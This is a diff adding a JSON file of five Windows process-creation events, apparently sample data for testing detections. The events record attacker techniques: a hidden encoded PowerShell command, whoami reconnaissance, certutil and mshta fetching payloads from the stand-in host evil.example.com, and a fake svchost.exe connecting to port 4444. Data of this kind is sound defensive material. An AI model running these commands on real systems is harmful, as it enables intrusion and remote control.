@@ -1,0 +1,52 @@
+[
+  {
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "OriginalFileName": "PowerShell.EXE",
+    "CommandLine": "powershell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIA",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "ParentCommandLine": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\jdoe",
+    "IntegrityLevel": "High",
+    "CurrentDirectory": "C:\\Users\\jdoe\\Desktop\\"
+  },
+  {
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "OriginalFileName": "Cmd.Exe",
+    "CommandLine": "cmd.exe /c whoami /all > C:\\Users\\Public\\info.txt",
+    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ParentCommandLine": "powershell.exe -nop -w hidden -enc JABZ",
+    "User": "CORP\\jdoe",
+    "IntegrityLevel": "High",
+    "CurrentDirectory": "C:\\Users\\jdoe\\"
+  },
+  {
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "OriginalFileName": "CertUtil.exe",
+    "CommandLine": "certutil -urlcache -split -f hxxp://evil.example.com/payload.exe C:\\Users\\Public\\update.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentCommandLine": "cmd.exe /c certutil",
+    "User": "CORP\\admin",
+    "IntegrityLevel": "High",
+    "CurrentDirectory": "C:\\Windows\\System32\\"
+  },
+  {
+    "Image": "C:\\Windows\\System32\\mshta.exe",
+    "OriginalFileName": "MSHTA.EXE",
+    "CommandLine": "mshta.exe javascript:a=GetObject(\"script:hxxp://evil.example.com/s.sct\")",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "ParentCommandLine": "explorer.exe",
+    "User": "CORP\\user1",
+    "IntegrityLevel": "Medium",
+    "CurrentDirectory": "C:\\Users\\user1\\Downloads\\"
+  },
+  {
+    "Image": "C:\\Users\\Public\\svchost.exe",
+    "OriginalFileName": "malware.exe",
+    "CommandLine": "C:\\Users\\Public\\svchost.exe -connect 198.51.100.42:4444",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentCommandLine": "cmd.exe /c start svchost.exe",
+    "User": "CORP\\user2",
+    "IntegrityLevel": "Medium",
+    "CurrentDirectory": "C:\\Users\\Public\\"
+  }
+]
